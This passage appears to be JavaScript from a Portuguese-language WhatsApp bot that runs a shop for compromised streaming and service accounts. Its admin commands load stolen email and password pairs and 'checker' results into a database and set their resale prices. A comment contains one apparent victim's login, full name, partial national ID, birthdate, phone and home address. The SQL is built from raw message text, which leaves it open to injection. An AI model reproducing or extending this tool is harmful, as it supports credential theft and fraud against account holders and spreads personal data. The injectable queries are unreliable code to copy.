        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //addloginjeff===SERVIÇO===EMAIL===SENHA===PREÇO===INFORMACÕES_ADICIONAIS
        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/addloginjeff===") > -1 && Adms.includes(Numero)) {

            Array_Total_Igual = Mensagem_Texto.match(/\=/igm);
            msg = Mensagem_Texto.split("===")

            if (msg[1] === "") {
                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }

            bMensagem_Texto = Mensagem_Texto.replace(/\'/igm, "")

            Array_Fila_Espera = []
            try {
                Texto = "ABASTECENDO LOGINS MODO JEFF (Simples com email e senha).."
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()

                Linhas = bMensagem_Texto.split("/addloginjeff===")
                Linhas.splice(0, 1);

                Contagem_Abastecidas = 0

                db = new sqlite3.Database(Diretorio_SQLITE_Principal);
                db.serialize(async function () {
                    db.run("begin transaction");

                    for (var index = 0; index < Linhas.length; index++) {
                        Abastecendo = true

                        Div = Linhas[index].split("===")

                        console.log(`Inserindo: ${Div[1]}`)

                        SERVICO = Div[0].toUpperCase()
                        EMAIL = Div[1]
                        SENHA = Div[2]
                        NOME = "0"
                        CPF = "§§"
                        USER = "0"
                        TELEFONE = "0"
                        ESTADO = "0"
                        CIDADE = "0"
                        PRECO = Div[3]
                        ADICIONAIS = Div[4]
                        DATA_MS_INSERIDO = Date.now()

                        db.run(`INSERT INTO LOGINS (SERVICO,EMAIL,SENHA,NOME,CPF,USER,TELEFONE,ESTADO,CIDADE,ADICIONAIS,PRECO,DATA_MS_INSERIDO) VALUES ('${SERVICO}','${EMAIL}','${SENHA}','${NOME}','${CPF}','${USER}','${TELEFONE}','${ESTADO}','${CIDADE}','${ADICIONAIS}','${PRECO}','${DATA_MS_INSERIDO}') ON CONFLICT DO NOTHING`);
                        Contagem_Abastecidas = parseInt(Contagem_Abastecidas) + 1
                    }

                    if (Contagem_Abastecidas != 0) {
                        console.log("comitando")
                        db.run("commit");
                    }

                    Texto = `*ABASTECIMENTO FINALIZADO*

${Linhas.length} Logins Colocados para abastecimento.

${Contagem_Abastecidas} Logins Abastecidas.`
                    for await (adm of Adms) {
                        await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3_ADMS_GRUPOS (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${adm}@c.us',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    }
                    Abastecendo = false
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                });

            } catch (error) {
                Texto = `Erro === ${error}`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
Abastecendo = false
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }
            return
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳


        //addloginauto1===SERVIÇO===PREÇO===RETORNO CHECKER
        //addloginauto1===NETFLIX===25===aprovada->agrojn@gmail.com | 98966365 |  Nome: Joarez De Oliveira Leite Neto | CPF: 980######## | Nascimento: 16/02/1984 | Telefone: (67) 99055001 | Endereço: RUA QUINTINO BOCAIUVA, 796 | Cidade: Aquidauana | Estado: MS | Pedidos: 1 | Aprovados: 1 | Cancelados: 0 | Cadastrado: 09/11/2013 | Atualizado: 27/09/2021 |
        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/addloginauto1===") > -1 && Adms.includes(Numero)) {

            Array_Total_Igual = Mensagem_Texto.match(/\=/igm);
            msg = Mensagem_Texto.split("===")

            if (msg[1] === "") {
                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            }

            Array_Fila_Espera = []
            try {
                Texto = "ABASTECENDO LOGINS MODO AUTOMATICO (Exclusivo para quem abastece com o retorno do checker)..."
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

                Linhas = Mensagem_Texto.split("\n")
                try {
                    Contagem_Abastecidas = 0

                    db = new sqlite3.Database(Diretorio_SQLITE_Principal);
                    db.serialize(async function () {
                        db.run("begin transaction");

                        for (var index = 0; index < Linhas.length; index++) {
                            try {

                                Abastecendo = true

                                Div = Linhas[index].split("===")
                                SERVICO = Div[1]
                                PRECO = Div[2]

                                Div = Linhas[index].split("aprovada->")
                                Div = Div[1].split(" | ")
                                EMAIL = Div[0]
                                SENHA = Div[1]

                                Div = Linhas[index].split("Nome: ")
                                Div = Div[1].split(" | ")
                                NOME = Div[0]

                                Div = Linhas[index].split("CPF: ")
                                Div = Div[1].split(" | ")
                                CPF = Div[0]

                                Div = Linhas[index].split("CPF: ")
                                Div = Div[1].split(" | ")
                                CPF = Div[0]

                                USER = "0"

                                Div = Linhas[index].split("Telefone: ")
                                Div = Div[1].split(" | ")
                                TELEFONE = Div[0]

                                Div = Linhas[index].split("Cidade: ")
                                Div = Div[1].split(" | ")
                                CIDADE = Div[0].toUpperCase()

                                Div = Linhas[index].split("Estado: ")
                                Div = Div[1].split(" | ")
                                ESTADO = Div[0].toUpperCase()

                                Div = Linhas[index].split("===");
                                ADICIONAIS = Div[3]

                                DATA_MS_INSERIDO = Date.now()

                                console.log(`Inserindo: ${EMAIL}`)

                                db.run(`INSERT INTO LOGINS (SERVICO,EMAIL,SENHA,NOME,CPF,USER,TELEFONE,ESTADO,CIDADE,ADICIONAIS,PRECO,DATA_MS_INSERIDO) VALUES ('${SERVICO}','${EMAIL}','${SENHA}','${NOME}','${CPF}','${USER}','${TELEFONE}','${ESTADO}','${CIDADE}','${ADICIONAIS}','${PRECO}','${DATA_MS_INSERIDO}') ON CONFLICT DO NOTHING`);
                                Contagem_Abastecidas = parseInt(Contagem_Abastecidas) + 1
                            } catch (error) {
                                console.log(error)

                                Texto = `*Ocorreu algum problema no abastecimento.*

Já tinha abastecido ${Contagem_Abastecidas}.

Erro: ${error}`
                                for await (adm of Adms) {
                                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3_ADMS_GRUPOS (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${adm}@c.us',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                                }
                                Abastecendo = false
                                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                            }
                        }

                        if (Contagem_Abastecidas != 0) {
                            console.log("comitando")
                            db.run("commit");
                        }

                        Texto = `*ABASTECIMENTO FINALIZADO*

${Linhas.length} Logins Colocados para abastecimento.

${Contagem_Abastecidas} Logins Abastecidas.`
                        for await (adm of Adms) {
                            for await (adm of Adms) {
                                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3_ADMS_GRUPOS (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${adm}@c.us',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                            }
                        }
                        Abastecendo = false
                        Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                    });
                } catch (error) {
                    Texto = `Erro === ${error}`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

                }
            } catch (error) {
                Texto = `Erro === ${error}`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            }
            return
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳








        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/valorloginporid===") > -1 && Adms.includes(Numero)) {
            try {
                Array_Total_Igual = Mensagem_Texto.match(/\=/igm);
                if (Array_Total_Igual.length != 6) {
                    Texto = `Comando inválido CODE:1`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

                }

                msg = Mensagem_Texto.split("===")
                ID = msg[1]
                NOVO_VALOR = msg[2]
                NOVO_VALOR = parseFloat(NOVO_VALOR).toFixed(2);

                if (ID === "") {
                    Texto = `Comando inválido CODE:2`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

                }
                if (NOVO_VALOR === "") {

                    Texto = `Comando inválido CODE:3`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

                }

                SERVICO = await DataBase_Better.prepare(`SELECT SERVICO FROM LOGINS WHERE _rowid_ = '${ID}'`).get()["SERVICO"]

                PRECO_ANTERIOR = await DataBase_Better.prepare(`SELECT PRECO FROM LOGINS WHERE _rowid_ = '${ID}'`).get()["PRECO"]
                PRECO_ANTERIOR = parseFloat(PRECO_ANTERIOR).toFixed(2);

                await DataBase_Better.prepare(`UPDATE LOGINS SET PRECO = '${NOVO_VALOR}' WHERE _rowid_ = '${ID}'`).run()

                Texto = `*Preço Login: ${SERVICO} do ID: ${ID} alterado com sucesso!*

*Valor anterior:* ${PRECO_ANTERIOR}

*Valor atual:* ${NOVO_VALOR}`
                for await (adm of Adms) {
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3_ADMS_GRUPOS (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${adm}@c.us',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                }
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            } catch (error) {

                Texto = `Comando inválido! CODE:${error}`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }
            return
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/valorloginporservico===") > -1 && Adms.includes(Numero)) {
            try {
                Array_Total_Igual = Mensagem_Texto.match(/\=/igm);
                if (Array_Total_Igual.length != 6) {
                    Texto = `Comando inválido CODE:1`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                }

                msg = Mensagem_Texto.split("===")
                SERVICO = msg[1]
                NOVO_VALOR = msg[2]
                NOVO_VALOR = parseFloat(NOVO_VALOR).toFixed(2);

                if (SERVICO === "") {
                    Texto = `Comando inválido CODE:2`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                }
                if (NOVO_VALOR === "") {

                    Texto = `Comando inválido CODE:3`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                }

                await DataBase_Better.prepare(`UPDATE LOGINS SET PRECO = '${NOVO_VALOR}' WHERE SERVICO = '${SERVICO.toUpperCase()}'`).run()

                Texto = `*Todos os preços do seriço: ${SERVICO}, foram alterados com sucesso!*

*Valor atual:* ${NOVO_VALOR}`
                for await (adm of Adms) {
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3_ADMS_GRUPOS (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${adm}@c.us',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                }
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            } catch (error) {

                Texto = `Comando inválido! CODE:${error}`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }
            return
        }
